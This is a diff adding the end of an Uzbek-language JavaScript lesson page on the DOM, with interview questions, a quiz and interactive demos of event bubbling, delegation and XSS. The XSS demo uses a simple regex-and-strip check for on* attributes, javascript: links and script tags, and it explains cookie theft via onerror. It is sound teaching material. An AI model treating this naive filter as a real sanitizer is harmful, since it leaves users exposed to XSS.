+  <section>
+    <div class="sec-head"><span class="n">06</span><h2>Suhbat savollari</h2></div><div class="iv-list"><details class="iv-item"><summary class="iv-q"><span class="qi">?</span>DOM nima?<span class="chev">›</span></summary><div class="iv-a">Document Object Model — HTML hujjatning brauzer xotirasidagi daraxt ko‘rinishi (tugunlar: element, matn, izoh…) va uni o‘qish/o‘zgartirish uchun API. HTML — matn, DOM — tirik obyektlar.</div></details><details class="iv-item"><summary class="iv-q"><span class="qi">?</span>Event bubbling va capturing nima?<span class="chev">›</span></summary><div class="iv-a">Hodisa uch fazada tarqaladi: capture (window’dan target’gacha pastga), target, bubble (target’dan window’gacha yuqoriga). Listener default bubble’da; capture: true bilan capture’da. stopPropagation tarqalishni to‘xtatadi.</div></details><details class="iv-item"><summary class="iv-q"><span class="qi">?</span>Event delegation nima va nima uchun?<span class="chev">›</span></summary><div class="iv-a">Ko‘p bolalar uchun bitta listener’ni ota elementga qo‘yish va e.target orqali manbani aniqlash. Kam xotira, dinamik qo‘shilgan elementlar ham ishlaydi. Bubbling tufayli mumkin.</div></details><details class="iv-item"><summary class="iv-q"><span class="qi">?</span>preventDefault va stopPropagation farqi?<span class="chev">›</span></summary><div class="iv-a">preventDefault — brauzerning default harakatini bekor qiladi (forma yuborish, havola), hodisa tarqalishda davom etadi. stopPropagation — tarqalishni to‘xtatadi, default harakat bo‘ladi.</div></details><details class="iv-item"><summary class="iv-q"><span class="qi">?</span>innerHTML, textContent, innerText farqi?<span class="chev">›</span></summary><div class="iv-a">innerHTML — HTML sifatida parse qiladi (XSS xavfi). textContent — xom matn, tez, yashirin elementlar matnini ham oladi. innerText — ko‘rinadigan matn, CSS’ni hisobga oladi (layout chaqiradi, sekinroq).</div></details><details class="iv-item"><summary class="iv-q"><span class="qi">?</span>e.target va e.currentTarget farqi?<span class="chev">›</span></summary><div class="iv-a">target — hodisa haqiqatan sodir bo‘lgan eng ichki element; currentTarget — hozir ishlayotgan listener biriktirilgan element. Delegatsiyada currentTarget — ota, target — bosilgan bola.</div></details></div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="n">07</span><h2>O‘zingizni tekshiring</h2></div><div class="quiz"><div class="q" data-correct="1"><div class="q-txt"><span class="qn">1.</span>Tugma bosildi. Qaysi tartib to‘g‘ri (hamma listener bubble’da)?</div><button class="opt">document → form → button</button><button class="opt">button → card → form → document</button><button class="opt">faqat button</button><div class="q-fb" data-ok="To‘g‘ri — bubble ichdan tashqariga." data-no="Yo‘q. Bubble fazasi target’dan yuqoriga."></div></div><div class="q" data-correct="1"><div class="q-txt"><span class="qn">2.</span>Forma yuborilganda sahifa qayta yuklanmasligi uchun?</div><button class="opt">stopPropagation()</button><button class="opt">preventDefault()</button><button class="opt">return true</button><div class="q-fb" data-ok="To‘g‘ri." data-no="Yo‘q. Default harakatni preventDefault bekor qiladi."></div></div><div class="q" data-correct="1"><div class="q-txt"><span class="qn">3.</span>Foydalanuvchi ismini ekranga chiqarish uchun xavfsiz usul?</div><button class="opt">innerHTML</button><button class="opt">textContent</button><button class="opt">document.write</button><div class="q-fb" data-ok="To‘g‘ri." data-no="Yo‘q. innerHTML XSS’ga ochiq."></div></div><div class="q" data-correct="1"><div class="q-txt"><span class="qn">4.</span>1000 ta qator, har biri bosilishi kerak. Eng yaxshi yondashuv?</div><button class="opt">1000 ta listener</button><button class="opt">Ota elementda bitta listener (delegatsiya)</button><button class="opt">setInterval bilan tekshirish</button><div class="q-fb" data-ok="To‘g‘ri." data-no="Yo‘q. Delegatsiya."></div></div><div class="q" data-correct="1"><div class="q-txt"><span class="qn">5.</span>input.value ning tipi (type="number" bo‘lsa ham)?</div><button class="opt">number</button><button class="opt">string</button><button class="opt">any</button><div class="q-fb" data-ok="To‘g‘ri — valueAsNumber yoki Number() kerak." data-no="Yo‘q. DOM value doim string."></div></div></div>
+  </section>
+  <footer>
+    <div class="next">
+      <span class="eyebrow">Keyingi modul · JavaScript</span>
+      <h3>Modullar, npm va fetch</h3>
+      <p>ES modullar, npm/Vite, fetch bilan backend’ga murojaat, JWT, CORS preflight — Spring Boot API bilan.</p>
+      <div class="topics"><span class="topic-pill">65 · Qanday ishlaydi</span><span class="topic-pill">66 · Tiplar</span><span class="topic-pill">67 · Closure</span><span class="topic-pill">68 · Obyekt/massiv</span><span class="topic-pill">69 · Prototype</span><span class="topic-pill">70 · Event loop</span><span class="topic-pill">71 · Promise</span><span class="topic-pill now">72 · DOM</span><span class="topic-pill">73 · Modul/fetch</span><span class="topic-pill">74 · Suhbat</span></div>
+    </div>
+  </footer>
+
+</div>
+<nav class="cnav" aria-label="Darslar orasida o'tish"><div class="cnav-grid"><a class="cn pv" href="71-promise-va-async-await.html"><span class="cl">← Oldingi dars</span><span class="ct">71 · Promise va async/await</span><span class="cs">🟨 JavaScript</span></a><a class="cn nx" href="73-modullar-npm-fetch.html"><span class="cl">Keyingi dars →</span><span class="ct">73 · Modullar, npm, fetch</span><span class="cs">🟨 JavaScript</span></a></div><div class="cnav-foot"><a href="index.html">☰ Barcha darslar</a><div class="cnav-bar" aria-hidden="true"><i style="width:81.8%"></i></div><span>72 / 88</span></div></nav>
+<script>try{var k='kodyoli:v',v=JSON.parse(localStorage.getItem(k)||'[]');if(v.indexOf(72)<0)v.push(72);localStorage.setItem(k,JSON.stringify(v));localStorage.setItem('kodyoli:last','72');var d=new Date(),t=d.getFullYear()+'-'+('0'+(d.getMonth()+1)).slice(-2)+'-'+('0'+d.getDate()).slice(-2),D=JSON.parse(localStorage.getItem('kodyoli:d')||'{}');D[t]=D[t]||[];if(D[t].indexOf(72)<0)D[t].push(72);localStorage.setItem('kodyoli:d',JSON.stringify(D));}catch(e){}</script>
+<script>
+(function(){"use strict";
+var root=document.documentElement,tb=document.getElementById('themeBtn');
+function cur(){var t=root.getAttribute('data-theme');if(t)return t;return matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';}
+tb.addEventListener('click',function(){root.setAttribute('data-theme',cur()==='dark'?'light':'dark');});
+[].slice.call(document.querySelectorAll('.quiz .q')).forEach(function(q){
+  var correct=+q.getAttribute('data-correct'),opts=[].slice.call(q.querySelectorAll('.opt')),fb=q.querySelector('.q-fb');
+  opts.forEach(function(o,k){o.addEventListener('click',function(){
+    if(q.dataset.done)return;q.dataset.done="1";opts.forEach(function(x){x.disabled=true;});
+    var ok=k===correct;o.classList.add(ok?'correct':'wrong');if(!ok)opts[correct].classList.add('correct');
+    fb.textContent=ok?fb.getAttribute('data-ok'):fb.getAttribute('data-no');fb.className='q-fb show '+(ok?'ok':'no');});});
+});
+/* generic stepper: .stepper[data-n] with #id-prev #id-next #id-play, calls window.__steppers[id](i) */
+window.mkStepper=function(id,n,onStep,ms){
+  var i=0,timer=null,play=document.getElementById(id+'Play'),prev=document.getElementById(id+'Prev'),next=document.getElementById(id+'Next'),bar=document.getElementById(id+'Bar');
+  function go(k){i=(k+n)%n;onStep(i);if(bar)bar.style.width=((i+1)/n*100)+'%';}
+  function stop(){if(timer){clearInterval(timer);timer=null;}if(play)play.textContent='▶ Avto';}
+  function start(){stop();play.textContent='⏸ To\'xtat';timer=setInterval(function(){go(i+1);},ms||1800);}
+  if(prev)prev.addEventListener('click',function(){stop();go(i-1);});
+  if(next)next.addEventListener('click',function(){stop();go(i+1);});
+  if(play)play.addEventListener('click',function(){timer?stop():start();});
+  go(0);return {go:go,stop:stop};
+};
+})();
+
+
+(function(){
+  var el=function(id){return document.getElementById(id);};
+  /* tree */
+  var prev=el('prev'),tree=el('tree'),map=[];
+  function build(node,d){if(node.nodeType===3){var t=node.textContent.trim();if(!t)return;tree.insertAdjacentHTML('beforeend','<div style="padding-left:'+(d*14+5)+'px"><span class="tx">"'+t+'"</span></div>');map.push(null);return;}
+    if(node.nodeType!==1)return;var attrs=[].map.call(node.attributes,function(a){return ' <span class="at">'+a.name+'="'+a.value+'"</span>';}).join('');
+    var i=map.length;map.push(node);node.dataset.ti=i;tree.insertAdjacentHTML('beforeend','<div data-i="'+i+'" style="padding-left:'+(d*14+5)+'px"><span class="tg">&lt;'+node.tagName.toLowerCase()+'</span>'+attrs+'<span class="tg">&gt;</span></div>');
+    [].forEach.call(node.childNodes,function(c){build(c,d+1);});}
+  build(el('f'),0);delete el('f').dataset.ti;
+  function pick(i){[].forEach.call(prev.querySelectorAll('.hl'),function(x){x.classList.remove('hl');});[].forEach.call(tree.querySelectorAll('.hl'),function(x){x.classList.remove('hl');});
+    var n=map[i];if(!n)return;n.classList.add('hl');var r=tree.querySelector('[data-i="'+i+'"]');if(r)r.classList.add('hl');
+    var sel=n.id?'#'+n.id:n.className&&n.className!=='hl'?'.'+n.className.replace(' hl','').split(' ')[0]:n.tagName.toLowerCase();
+    el('qq').innerHTML='<code>document.querySelector("'+sel+'")</code> → &lt;'+n.tagName.toLowerCase()+'&gt; · ota: &lt;'+(n.parentElement?n.parentElement.tagName.toLowerCase():'—')+'&gt; · bolalar: '+n.children.length;}
+  tree.addEventListener('click',function(e){var r=e.target.closest('[data-i]');if(r)pick(+r.dataset.i);});
+  prev.addEventListener('click',function(e){e.preventDefault();var n=e.target.closest('[data-ti]');if(n)pick(+n.dataset.ti);});
+  el('f').addEventListener('submit',function(e){e.preventDefault();});
+
+  /* propagation (real events) */
+  var L=[el('L0'),el('L1'),el('L2'),el('L3')],NM=['document','form#tolov','div.card','button'],log=[],anim=null;
+  L.forEach(function(l,i){
+    l.addEventListener('click',function(e){if(e.target.id!=='pBtn')return;log.push(['c',i]);if(i===1&&el('oCap').checked){e.stopPropagation();log.push(['x',i]);}},true);
+    l.addEventListener('click',function(e){if(e.target.id!=='pBtn')return;log.push([i===3?'t':'b',i]);if(i===2&&el('oStop').checked){e.stopPropagation();log.push(['x',i]);}},false);});
+  el('pBtn').addEventListener('click',function(){setTimeout(play,0);});
+  function play(){var steps=log.slice();log=[];clearInterval(anim);
+    el('plog').innerHTML=steps.map(function(s){return s[0]==='x'?'<div class="c">⛔ '+NM[s[1]]+': stopPropagation() — tarqalish to‘xtadi</div>':'<div class="'+s[0]+'">'+(s[0]==='c'?'↓ capture':s[0]==='t'?'● target':'↑ bubble')+' · '+NM[s[1]]+'</div>';}).join('');
+    var k=0,rows=el('plog').children;L.forEach(function(l){l.classList.remove('cap','tgt','bub');});
+    anim=setInterval(function(){if(k>=steps.length){clearInterval(anim);var st=steps.some(function(s){return s[0]==='x';});
+        el('prEx').innerHTML=st?'<b>stopPropagation</b> hodisani to‘xtatdi — yuqoridagi (yoki pastdagi) listener’lar uni <b>umuman ko‘rmadi</b>. Ehtiyotkorlik bilan ishlating: analitika yoki dropdown yopish kabi global listener’lar buziladi.':'Hodisa avval <b>document’dan pastga</b> (capture, qizil), keyin <b>target</b> (sariq), so‘ng <b>yuqoriga</b> (bubble, yashil) o‘tdi. Har qatlamdagi listener o‘z navbatida ishladi.';return;}
+      var s=steps[k];rows[k].classList.add('on');if(s[0]!=='x'){L.forEach(function(l){l.classList.remove('cap','tgt','bub');});L[s[1]].classList.add(s[0]==='c'?'cap':s[0]==='t'?'tgt':'bub');}k++;},450);}
+
+  /* delegation */
+  var ul=el('txl'),n=0,NMS=['Korzinka','Uzum','Payme','Yandex Go','Beeline','Kommunal','P2P','Havas'];
+  function add(k){var h='';for(var i=0;i<k;i++){n++;h+='<li data-id="'+n+'"><span>#'+n+' '+NMS[n%NMS.length]+' — '+((n*37%900+10)*1000).toLocaleString('ru-RU')+'</span><button class="del">✕</button></li>';}ul.insertAdjacentHTML('beforeend',h);el('dN').textContent=ul.children.length;}
+  ul.addEventListener('click',function(e){var d=e.target.closest('button.del');if(d){var li=d.closest('li');var id=li.dataset.id;li.remove();el('dN').textContent=ul.children.length;el('dEx').innerHTML='✕ bosildi → <code>e.target.closest("button.del")</code> topildi → #'+id+' o‘chirildi. Qator bosilishi ishga tushmadi (return).';return;}
+    var li=e.target.closest('li');if(!li)return;[].forEach.call(ul.querySelectorAll('.sel'),function(x){x.classList.remove('sel');});li.classList.add('sel');
+    el('dEx').innerHTML='Bosilgan: <code>e.target</code> = &lt;'+e.target.tagName.toLowerCase()+'&gt;, <code>e.currentTarget</code> = &lt;ul&gt;. closest("li") → #'+li.dataset.id+'. Bitta listener '+ul.children.length+' ta qatorga xizmat qilyapti.';});
+  el('dAdd').addEventListener('click',function(){add(100);el('dEx').innerHTML='100 ta yangi qator qo‘shildi — ularga listener qo‘shmadik, lekin bosish ishlaydi (bubbling).';});
+  add(40);
+
+  /* xss (safe analysis) */
+  function xss(){var v=el('xin').value;el('xT').textContent=v;
+    var tpl=document.createElement('template');tpl.innerHTML=v;var danger=[];
+    tpl.content.querySelectorAll('*').forEach(function(n){[].forEach.call(n.attributes,function(a){if(/^on/i.test(a.name)||/javascript:/i.test(a.value))danger.push('&lt;'+n.tagName.toLowerCase()+' '+a.name+'="…"&gt;');});if(n.tagName==='SCRIPT'||n.tagName==='IFRAME')danger.push('&lt;'+n.tagName.toLowerCase()+'&gt;');});
+    tpl.content.querySelectorAll('*').forEach(function(n){[].slice.call(n.attributes).forEach(function(a){if(/^on/i.test(a.name))n.removeAttribute(a.name);});if(n.tagName==='IMG')n.removeAttribute('src');});
+    tpl.content.querySelectorAll('script,iframe').forEach(function(n){n.remove();});
+    el('xH').innerHTML='';el('xH').appendChild(tpl.content.cloneNode(true));
+    el('xHp').innerHTML=danger.length?'<span class="bad">⚠ Brauzer yaratgan bo‘lardi: '+danger.join(', ')+'</span>\nHaqiqiy sahifada rasm yuklanmaydi → onerror ishlaydi → cookie hujumchiga ketadi.':'Xavfli atribut topilmadi.';
+    el('xEx').innerHTML=danger.length?'<code>innerHTML</code> satrni <b>HTML sifatida</b> parse qildi va hodisa atributi bilan element yaratdi. <code>&lt;script&gt;</code> teglari innerHTML orqali ishlamaydi — lekin <code>onerror</code>, <code>onload</code>, <code>javascript:</code> havolalari ishlaydi. <code>textContent</code> esa hamma narsani oddiy matn qilib ko‘rsatdi.':'Xavfli narsa yo‘q — lekin baribir foydalanuvchi matni uchun textContent ishlating.';}
+  el('xin').addEventListener('input',xss);xss();
+})();
+
+</script>
+</body>
+</html>
